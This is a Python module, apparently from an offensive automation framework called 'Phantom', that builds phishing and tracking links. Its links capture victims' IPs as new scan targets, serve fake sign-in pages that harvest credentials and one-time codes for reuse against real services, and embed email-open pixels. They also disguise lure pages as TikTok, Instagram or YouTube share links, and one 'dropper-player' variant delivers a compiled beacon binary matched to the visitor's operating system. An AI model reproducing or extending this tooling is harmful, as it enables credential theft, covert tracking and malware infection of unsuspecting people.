"""
grabbit.py — IP-grabber / tracking links.

Builds a short tracking link; when a victim clicks it, their real IP is
captured and becomes a NEW machine target in the WorldModel (a pivot:
the click proves the person is real, the IP is the next box to scan).

Beyond click capture the grabber can create:

  * login-page links  (/l/<code>) — a fake sign-in form that captures
    submitted credentials (+ optional OTP) for reuse against real services
  * open-tracking links (/px/<code>) — a 1x1 pixel that proves the email
    was opened (embedded in HTML bodies)
  * video-lure links   (/v/<code>) — a page that looks like an Instagram
    Reel / TikTok / YouTube Short and plays a real embedded video; the page
    load is a click, so the victim's IP is captured exactly like a normal
    link click

The default provider is Phantom's own self-hosted TrackingServer
(`tracker.py`) — no fake placeholder URL, no third-party service. Custom
creator/fetcher pairs can still be injected for tests or an operator that
prefers an external tracker.
"""

from __future__ import annotations

import time
import uuid
from dataclasses import dataclass
from typing import Callable, Dict, List, Optional

from phantom.automation.social.tracker import (
    CredCapture,
    HitStore,
    OpenEvent,
    TrackingServer,
    VictimHit,
    env_tracker,
    public_base_url,
)


@dataclass
class GrabLink:
    short_url: str
    code: str


class IpGrabber:
    """Creates tracking links and polls for clicks / opens / credentials.

    `creator(code) -> short_url`, `fetcher(code) -> [VictimHit]`,
    `open_fetcher(code) -> [OpenEvent]` and
    `cred_fetcher(code) -> [CredCapture]` are injectable so tests never
    hit the network. When left unset, the grabber starts Phantom's own
    tracking server (PHANTOM_TRACK_* env) and polls against it.
    """

    def __init__(self, creator: Optional[Callable] = None,
                 fetcher: Optional[Callable] = None,
                 open_fetcher: Optional[Callable] = None,
                 cred_fetcher: Optional[Callable] = None,
                 server: Optional[TrackingServer] = None) -> None:
        self._server = server
        self._creator = creator
        self._fetcher = fetcher
        self._open_fetcher = open_fetcher
        self._cred_fetcher = cred_fetcher
        self._links: Dict[str, GrabLink] = {}
        # lazy default provider: constructed on first use so importing the
        # module never binds a socket
        self._default_server: Optional[TrackingServer] = None
        self._default_store: Optional[HitStore] = None

    # -- default (self-hosted) provider ------------------------------------

    def _ensure_default_server(self) -> TrackingServer:
        if self._default_server is None:
            self._default_server = self._server or env_tracker()
            self._default_store = self._default_server.store
            self._default_server.start()
        return self._default_server

    def _default_create(self, code: str, prefix: str = "") -> str:
        server = self._ensure_default_server()
        return f"{public_base_url(server.host, server.port)}/{prefix}{code}"

    def _default_fetch(self, code: str) -> List[VictimHit]:
        server = self._ensure_default_server()
        return server.store.hits(code)

    def _default_open_fetch(self, code: str) -> List[OpenEvent]:
        server = self._ensure_default_server()
        return server.store.opens(code)

    def _default_cred_fetch(self, code: str) -> List[CredCapture]:
        server = self._ensure_default_server()
        return server.store.creds(code)

    # -- public API --------------------------------------------------------

    def create_link(self, label: str = "phish", prefix: str = "") -> GrabLink:
        """Create a tracking link. `prefix` selects the route on the
        tracking server: "" (click), "l/" (login page) or "px/" (pixel)."""
        code = f"{label}-{uuid.uuid4().hex[:8]}"
        creator = self._creator or (lambda c: self._default_create(c, prefix))
        url = creator(code)
        link = GrabLink(short_url=url, code=code)
        self._links[code] = link
        return link

    def create_login_link(self, label: str = "login") -> GrabLink:
        """A fake sign-in page URL that captures submitted credentials."""
        return self.create_link(label=label, prefix="l/")

    def _register_video(self, code: str, video: Optional[Dict[str, str]]) -> None:
        """Attach real-video metadata to a code so the lure page renders it."""
        if not video:
            return
        if self._server is not None and self._server.running:
            self._server.register_video(code, video)
        elif self._default_server is not None:
            self._default_server.register_video(code, video)

    def create_video_link(self, label: str = "video",
                          video: Optional[Dict[str, str]] = None) -> GrabLink:
        """A reel/short-style lure URL (IG Reels / TikTok / YT Shorts skin)
        that captures the victim's IP as soon as the page loads. `video`
        carries the real video {id, title, channel} the page renders."""
        link = self.create_link(label=label, prefix="v/")
        self._register_video(link.code, video)
        return link

    def create_video_share_link(self, label: str = "video",
                                platform: str = "tiktok",
                                handle: str = "",
                                video: Optional[Dict[str, str]] = None) -> GrabLink:
        """A SHARE-format video link — the same URL shape you get when you
        press "share" on a reel or short:

          * tiktok:    /@<handle>/video/<code>
          * instagram: /reel/<code>  (also valid: /p/<code>)
          * youtube:   /shorts/<code>

        The victim sees a familiar share link and opens it like any video;
        the tracking code is embedded in the path and there is NO profile
        identifier that can be traced back to a real account. The page
        serves the platform-skinned lure, plays the REAL video passed in
        `video` and captures the IP on load.
        """
        platform = (platform or "tiktok").lower()
        if platform == "instagram":
            prefix = "reel/"
        elif platform == "youtube":
            prefix = "shorts/"
        else:  # tiktok share links carry the handle
            h = (handle or "creator").strip().lstrip("@").replace(" ", "_")
            prefix = f"@{h}/video/"
        link = self.create_link(label=label, prefix=prefix)
        self._register_video(link.code, video)
        return link

    def create_player_link(self, label: str = "player",
                           platform: str = "instagram",
                           handle: str = "",
                           video: Optional[Dict[str, str]] = None,
                           payload_url: str = "",
                           payload_urls: Optional[Dict[str, str]] = None) -> GrabLink:
        """Dropper-player lure: a share-format reel/shorts URL whose page
        plays the REAL video AND delivers the compiled beacon on the play
        click (fail-soft: payload down = page looks like it won't load).
        The recorded hit is the page load, exactly like the plain video
        lure.

        `payload_urls` ({platform -> url}) makes the page serve the binary
        matching the visitor's User-Agent, so the target OS does not have
        to be known when the lure is built."""
        platform = (platform or "instagram").lower()
        if platform == "youtube":
            prefix = "shorts/"
        elif platform == "tiktok":
            h = (handle or "creator").strip().lstrip("@").replace(" ", "_")
            prefix = f"@{h}/video/"
        else:
            prefix = "reel/"
        link = self.create_link(label=label, prefix=prefix)
        self._register_video(link.code, video)
        if payload_url or payload_urls:
            server = self._server or self._default_server
            if server is not None:
                try:
                    server.register_player(link.code, payload_url,
                                           meta=video or {},
                                           payload_urls=payload_urls)
                except Exception:
                    pass
        return link

    def poll_hits(self, link: GrabLink, timeout: float = 120.0) -> List[VictimHit]:
        """Poll for clicks; return the victim IPs captured."""
        deadline = time.time() + timeout
        fetcher = self._fetcher or self._default_fetch
        hits: List[VictimHit] = []
        while time.time() < deadline:
            try:
                found = fetcher(link.code)
                for h in found:
                    if h.ip not in {x.ip for x in hits}:
                        hits.append(h)
                if hits:
                    break
            except Exception:
                pass
            time.sleep(5)
        return hits

    def poll_opens(self, link: GrabLink, timeout: float = 60.0) -> List[OpenEvent]:
        """Poll for email-opens (pixel loads)."""
        deadline = time.time() + timeout
        fetcher = self._open_fetcher or self._default_open_fetch
        opens: List[OpenEvent] = []
        while time.time() < deadline:
            try:
                for ev in fetcher(link.code):
                    if ev not in opens:
                        opens.append(ev)
                if opens:
                    break
            except Exception:
                pass
            time.sleep(5)
        return opens

    def poll_creds(self, link: GrabLink, timeout: float = 120.0) -> List[CredCapture]:
        """Poll for credentials submitted through a login page."""
        deadline = time.time() + timeout
        fetcher = self._cred_fetcher or self._default_cred_fetch
        creds: List[CredCapture] = []
        while time.time() < deadline:
            try:
                for c in fetcher(link.code):
                    if c not in creds:
                        creds.append(c)
                if creds:
                    break
            except Exception:
                pass
            time.sleep(5)
        return creds

    def to_findings(self, hits: List[VictimHit], target: str):
        from phantom.automation.belief import Finding
        return [Finding(kind="victim_ip", key=h.ip,
                        value={"ip": h.ip, "user_agent": h.user_agent,
                               "time": h.time, "os": h.os, "device": h.device,
                               "geo": h.geo, "referrer": h.referrer},
                        confidence=0.9, source="grabber", target=target)
                for h in hits]
